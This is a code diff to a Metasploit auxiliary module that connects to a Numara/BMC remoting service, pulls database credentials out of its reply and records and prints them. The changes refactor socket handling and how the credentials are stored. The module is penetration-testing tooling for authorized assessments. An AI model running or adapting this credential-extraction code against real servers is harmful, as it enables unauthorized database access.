@@ -159,8 +159,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def fill_loot_from_packet(packet_reply, loot)
-    loot.each_key {
-      |str|
+    loot.each_key { |str|
       if loot[str] != nil
         next
       end
@@ -182,8 +181,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     packet = prepare_packet(true)
 
-    ctx = { 'Msf' => framework, 'MsfExploit' => self }
-    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => rport, 'Context' => ctx })
+    sock = connect
     if sock.nil?
       fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
     else
@@ -224,7 +222,7 @@ class Metasploit3 < Msf::Auxiliary
         # This is most likely an older Numara version, re-do the packet and send again.
         print_error("#{rhost}:#{rport} - Received \"Service not found\", trying again with new packet...")
         sock.close
-        sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => rport, 'Context' => ctx })
+        sock = connect
         if sock.nil?
           fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
         else
@@ -287,17 +285,21 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if loot[schema_owner] and loot[database_pw] and loot[database_type] and loot[database_server_name]
+
+      begin
+        resolved_ip = ::Rex::Socket.getaddress(loot[database_server_name].split('\\')[0])
+      rescue
+        resolved_ip = nil
+      end
+
       service_data = {
-        # The database hostname is actually loot[database_server_name].split('\\')[0], not rhost.
-        # However loot[database_server_name].split('\\')[0] is usually an internal hostname,
-        # so report the database address as rhost which is what we expect in most cases.
-        address: rhost,
-        # We can't get the database port number from packet_reply, so set it to rport.
+        address: (resolved_ip == nil ? rhost : resolved_ip),
         port: rport,
-        service_name: loot[database_type],
+        service_name: (resolved_ip == nil ? (ssl ? 'https' : 'http') : loot[database_type]),
         protocol: 'tcp',
         workspace_id: myworkspace_id
       }
+
       credential_data = {
         origin_type: :service,
         module_fullname: self.fullname,
@@ -306,18 +308,23 @@ class Metasploit3 < Msf::Auxiliary
         username: loot[schema_owner] ,
         # We store the SID for Oracle or the instance name for SQL Server.
         # There's no realm_key for SQL Server so store it as Oracle anyway.
-        realm_key: Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER,
-        realm_value: loot[database_server_name].split('\\')[1]
+        realm_key: (database_type == "SQLServer" ? nil : Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER),
+        realm_value: (database_type == "SQLServer" ? nil : loot[database_server_name].split('\\')[1])
       }
 
       credential_data.merge!(service_data)
       credential_core = create_credential(credential_data)
-      login_data = {
-        core: credential_core,
-        status: Metasploit::Model::Login::Status::UNTRIED
-      }
-      login_data.merge!(service_data)
-      create_credential_login(login_data)
+
+      if resolved_ip == nil
+        create_credential_origin(credential_core)
+      else
+        login_data = {
+          core: credential_core,
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+        login_data.merge!(service_data)
+        create_credential_login(login_data)
+      end
 
       print_status("#{rhost}:#{rport} - Stored SQL credentials: #{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}")
     end
